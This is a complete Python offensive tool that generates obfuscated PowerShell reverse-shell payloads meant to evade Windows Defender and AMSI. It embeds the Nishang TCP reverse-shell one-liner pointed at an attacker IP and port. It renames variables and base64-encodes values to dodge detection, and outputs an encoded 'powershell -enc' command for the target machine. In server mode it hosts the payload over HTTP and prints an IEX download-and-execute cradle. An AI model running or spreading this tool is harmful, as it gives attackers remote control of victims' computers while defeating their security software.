#!/usr/bin/python3
import base64
import sys
import signal
import argparse
import os
import http.server
import socketserver


# ====================================================================================================================================
# ====================================================================================================================================
# Obfuscation characters. Strings at the left will be replaced with those at the right. Edit this if you want custom obfuscation
obf_dict = {
    "$client": "$c",
    "$stream": "$s",
    "$bytes": "$b",
    "$data": "$d",
    "$sendback": "$sb",
    "$sendbyte": "$sy",
} 
# ====================================================================================================================================
# ====================================================================================================================================


# Define color dictionary
color = {
    "RESET": '\033[0m',
    "RED": '\033[91m',
    "GREEN": '\033[92m',
    "YELLOW": '\033[93m',
    "BLUE": '\033[94m',
    "MAGENTA": '\033[95m',
    "CYAN": '\033[96m',
    "WHITE": '\033[97m'
}


# Define some pretty characters
STAR: str = f"{color['YELLOW']}[{color['BLUE']}*{color['YELLOW']}]{color['RESET']}"
WARNING_STR: str = f"{color['RED']}[{color['YELLOW']}!{color['RED']}]{color['RESET']}"


# Ctrl+C
def signal_handler(sig, frame)->None:
    print(f"\n{WARNING_STR} {color['RED']}Ctrl+C! Exiting...{color['RESET']}")
    sys.exit(0)


# Capture Ctrl+C
signal.signal(signal.SIGINT, signal_handler)


def get_arguments_from_user()->argparse.Namespace:
    """
    Get arguments/flags from user.
    """
    parser = argparse.ArgumentParser(prog=f'python3 {sys.argv[0]}',
                                     description=f'{color["CYAN"]}PowerShell{color["RED"]} Windows Defender Obfuscator{color["RESET"]}')
    # Define commands
    commands = parser.add_subparsers(dest='command', help='Available commands')

    ## Define 'revshell' command
    revshell: str = 'revshell' # command name
    revshell_command = commands.add_parser(revshell, help=f'{color["CYAN"]}Generate an obfuscated {color["RED"]}PowerShell{color["CYAN"]} payload to avoid {color["RED"]}Windows Defender{color["RESET"]}', 
                    description=f'{color["CYAN"]}Generate an obfuscated {color["RED"]}PowerShell{color["CYAN"]} payload to avoid {color["RED"]}Windows Defender{color["RESET"]}', 
                                           epilog=f"{color['YELLOW']}Example:{color['BLUE']} {sys.argv[0]} revshell -i 10.10.16.98 -p 4444{color['RESET']}")
    revshell_command.add_argument('-i', '--attacker-ip', type=str, required=True, help='Attacker IP address.')
    revshell_command.add_argument('-p', '--port', type=int, required=True, help='Port to get revshell.')
    revshell_command.add_argument('-v', '--verbose', action='store_true', help='Display payloads used and generated, along with some extra info.')
    revshell_command.add_argument('--keep-pwd', action='store_true', help='Revshell obtained will show working directory/path. Keeping this might trigger AMSI/Defender.')
    revshell_command.add_argument('--enc-b64', action='store_true', help='Encode in base64 the Attacker IP address and port provided to the payload.')
    revshell_command.add_argument('--no-banner', action='store_true', help='Do not print script banner.')

    ## Define 'server' command
    server_str: str = 'server' # command name
    server_command = commands.add_parser(server_str, help=f'{color["CYAN"]}Set a temporal HTTP server that will then call a {color["RED"]}PowerShell{color["CYAN"]} payload to avoid {color["RED"]}Windows Defender{color["RESET"]}', 
                    description=f'{color["CYAN"]}Generate an obfuscated {color["RED"]}PowerShell{color["CYAN"]} payload to avoid {color["RED"]}Windows Defender{color["RESET"]}', 
                                         epilog=f"{color['YELLOW']}Example:{color['BLUE']} {sys.argv[0]} server -i 10.10.16.98 -p 4444{color['RESET']}")
    server_command.add_argument('-i', '--attacker-ip', type=str, required=True, help='Attacker IP address serving temporal HTTP server.')
    server_command.add_argument('-p', '--port', type=int, required=True, help='Listening port to get reverse shell.')
    server_command.add_argument('--server-port', type=int, default=8000, help='Port serving temporal HTTP server. Default: 8000.')
    server_command.add_argument('-o', '--outfile', type=str, default='revshell.ps1', help='Name of the temporal PowerShell file storing obfuscated payload. Default: revshell.ps1')
    server_command.add_argument('-v', '--verbose', action='store_true', help='Display payloads used and generated, along with some extra info.')
    server_command.add_argument('--keep-pwd', action='store_true', help='Revshell obtained will show working directory/path. Keeping this might trigger AMSI/Defender.')
    server_command.add_argument('--keep-file', action='store_true', help='This script will create a file named as "--outfile" flag and then is deleted. Use this flag if you want to keep the generated file/payload.')
    server_command.add_argument('--enc-b64', action='store_true', help='Encode in base64 the Attacker IP address and port provided to the payload.')
    server_command.add_argument('--no-banner', action='store_true', help='Do not print script banner.')

    return parser.parse_args()


def print_banner():
    print(f"""
{color['RED']} ______{color['YELLOW']}                                 _______ _______  ______ _ 
{color['RED']}(____  \\{color['YELLOW']}                               (_______|_______)/ _____) |
{color['RED']} ____)  )_   _ ____  _____  ___  ___{color['YELLOW']}    _______ _  _  _( (____ | |
{color['RED']}|  __  (| | | |  _ \\(____ |/___)/___){color['YELLOW']}  |  ___  | ||_|| |\\____ \\| |
{color['RED']}| |__)  ) |_| | |_| / ___ |___ |___ |{color['YELLOW']}  | |   | | |   | |_____) ) |
{color['RED']}|______/ \\__  |  __/\\_____(___/(___/{color['YELLOW']}   |_|   |_|_|   |_(______/|_|
{color['BLUE']} ______ {color['RED']}(____/|_|{color['BLUE']}     ______                  _           _ _     
{color['BLUE']}(_____ \\ / _____)    (_____ \\                | |         | | |    
{color['BLUE']} _____) | (____ _____ _____) )_____ _   _ ___| |__  _____| | |    
{color['BLUE']}|  ____/ \\____ (_____)  __  /| ___ | | | /___)  _ \\| ___ | | |    
{color['BLUE']}| |      _____) )    | |  \\ \\| ____|\\ V /___ | | | | ____| | |    
{color['BLUE']}|_|     (______/     |_|   |_|_____) \\_/(___/|_| |_|_____)\\_)_) 
  {color['GREEN']}by gunzf0x {color['CYAN']}(https://github.com/gunzf0x/BypassAMSI_PSRevshell){color['RESET']} 👻    
    """)


def encode_in_base64(text_to_encode: str | int)->str:
    """
    Encode text in base64
    """
    # Encode the text in base64
    encoded_text = base64.b64encode(str(text_to_encode).encode("utf-8"))
    # Convert the byte output to a string for readability
    encoded_text_str = encoded_text.decode("utf-8")
    return encoded_text_str


def obfuscate_powershell_payload(args: argparse.Namespace):
    """
    Create and obfuscate PowerShell payload
    """
    # Original Nishang revshell oneliner (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
    original_payload: str = f"$client = New-Object System.Net.Sockets.TCPClient('{args.attacker_ip}',{args.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    # Obfuscate payload
    obfuscated_payload = original_payload
    # Replace text based on the dictionary givenm
    for text in obf_dict:
        obfuscated_payload = obfuscated_payload.replace(text, obf_dict[text])
    # Additionally, remove 'pwd'
    if not args.keep_pwd:
        obfuscated_payload = obfuscated_payload.replace(' + (pwd).Path', '')
    if args.enc_b64:
        base64_ip = encode_in_base64(args.attacker_ip)
        base64_port = encode_in_base64(args.port)
        if args.verbose:
            print(f"{STAR} Base64 Attacker-IP: {base64_ip}")
            print(f"{STAR} Base64 listening port: {base64_port}")
        obfuscated_payload = obfuscated_payload.replace(f"New-Object System.Net.Sockets.TCPClient('{args.attacker_ip}',{args.port})",
                                                        f"New-Object System.Net.Sockets.TCPClient(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{base64_ip}'))),[int]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{base64_port}'))))")
    if args.verbose:
        print(f"{STAR} Original payload:\n{color['CYAN']}{original_payload}{color['RESET']}")
        print(f"{STAR} Obfuscated payload:\n{color['RED']}{obfuscated_payload}{color['RESET']}")
    return obfuscated_payload


def write_payload_to_file(args: argparse.Namespace, payload: str)->str:
    """
    Write the .ps1 file that will be exposed in the HTTP server in the directory where the script is being executed.
    """
    # Get current directory
    current_directory = os.getcwd()
    # Define the file name and path
    file_path = os.path.join(current_directory, args.outfile)
    try:
        with open(file_path, 'w') as f:
            f.write(payload)
    except Exception as e:
        print(f"{WARNING_STR} {color['RED']} Error. Something happened:\n{color['YELLOW']}{e}{color['RESET']}")
    print(f"{STAR} Obfuscated payload written into {color['CYAN']}{args.outfile}{color['RESET']} file in the current directory...")
    # Return file path since we will use it later to delete the file
    return file_path


def encode_payload(args: argparse.Namespace, obf_payload: str)->str:
    """
    Encode payload to be interpreted by PowerShell.
    """
    # Encode payload in "utf-16le"
    payload_utf16le = obf_payload.encode('utf-16le')
    # Then encode that into "base64"
    payload_base64 = base64.b64encode(payload_utf16le).decode('utf-8')
    if args.verbose:
        print(f"{STAR} Payload generated:\n{payload_base64}")
    return payload_base64 


def generate_server_command(args: argparse.Namespace)->str:
    """
    Generates the PowerShell command that will make a request to HTTP temporal server
    """
    command: str = f'IEX(New-Object Net.WebClient).downloadString("http://{args.attacker_ip}:{args.server_port}/{args.outfile}")'
    if args.verbose:
        print(f"{STAR} Server request command:\n{color['RED']}{command}{color['RESET']}")
    return encode_payload(args, command)


def print_instructions(args: argparse.Namespace, payload: str)->None:
    """
    Just print the command the user should copy/paste to start a revshell.
    """
    print(f"{STAR} Payload successfully generated. Execute the following command in the target machine:\n\n{color['RED']}powershell -enc {payload}{color['RESET']}\n\n{color['YELLOW']}(don't forget to start listener on port {color['GREEN']}{args.port!r}{color['YELLOW']}){color['RESET']}\n")


# Create class for HTTP server
class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"{STAR} Received GET request for: {color['GREEN']}{self.path}{color['RESET']}")
        super().do_GET()


def run_HTTP_server(args: argparse.Namespace, file_path: str)->None:
    """
    Starts the HTTP server that will expose PowerShell script.
    """
    try:
        with socketserver.TCPServer(("", args.server_port), RequestHandler) as httpd:
            print(f"{STAR} Serving{color['BLUE']} HTTP server {color['RESET']}on port {color['RED']}{args.server_port}{color['RESET']} with payload file {color['CYAN']}{args.outfile}{color['RESET']}...")
            httpd.serve_forever()
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"{WARNING_STR}{color['RED']} Port {color['YELLOW']}{args.server_port} {color['RED']}is already in use. Please set another port with {color['YELLOW']}--server-port{color['RED']} and retry...{color['RESET']}")
        sys.exit(1)
    finally:
        if os.path.isfile(file_path) and not args.keep_file:
            os.remove(file_path)
            print(f"{STAR} File {color['CYAN']}{args.outfile!r}{color['RESET']} deleted (use {color['YELLOW']}--keep-file{color['RESET']} if you do not want this).")


def main()->None:
    # Get arguments from user
    args: argparse.Namespace = get_arguments_from_user()
    # Check number of arguments provided
    if len(sys.argv) < 4:
        print(f"{WARNING_STR}{color['RED']} Example usages: {color['YELLOW']} python3 {sys.argv[0]} revshell -h{color['RESET']}")
        print(f"                    {color['YELLOW']} python3 {sys.argv[0]} server -h{color['RESET']}")
        sys.exit(1)
    # Print my banner made with love
    if not args.no_banner:
        print_banner()
    # Generate and obfuscate payload
    obf_payload: str = obfuscate_powershell_payload(args)
    # If we just want a revshell payload, just encode it and print it
    if args.command == 'revshell':
        # Encode the obfuscated payload
        powershell_enc_command = encode_payload(args, obf_payload)
        # Print the command to execute
        print_instructions(args, powershell_enc_command)
    # If we select 'server' command, write the payload into a file, make a command that will request this file through PS, and start a temporal HTTP server that serves the file
    if args.command == 'server':
        # Write the obfuscated payload into a file in the current directory
        path_file_written: str = write_payload_to_file(args, obf_payload)
        # Get the encoded command that will make the request to the temporal HTTP server
        powershell_enc_command: str = generate_server_command(args)
        # Print the command to execute
        print_instructions(args, powershell_enc_command)
        # Start a temporal Python HTTP server
        run_HTTP_server(args, path_file_written)
    

if __name__ == "__main__":
    main()
